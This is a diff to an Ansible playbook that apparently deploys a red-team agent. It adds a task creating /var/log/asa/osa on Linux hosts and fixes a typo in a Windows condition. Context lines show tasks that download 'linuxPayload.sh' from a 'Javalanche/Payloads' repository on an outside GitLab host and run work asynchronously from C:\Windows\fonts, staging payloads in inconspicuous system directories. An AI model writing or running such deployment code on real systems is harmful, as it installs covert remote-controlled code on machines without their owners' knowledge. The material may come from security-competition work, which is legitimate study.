@@ -3,6 +3,12 @@
     set_fact:
       linux_distros: ["RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Debian", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
 
+  - name: Linux make directory
+    ansible.builtin.file:
+      path: /var/log/asa/osa
+      state: directory
+    when: ansible_os_family in linux_distros
+
   - name: Linux Download Agent
     get_url:
       url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
@@ -45,5 +51,5 @@
     poll: 0
     args:
       chdir: C:\\Windows\\fonts
-    when: ansible_os_familt == "Windows"
+    when: ansible_os_family == "Windows"
 
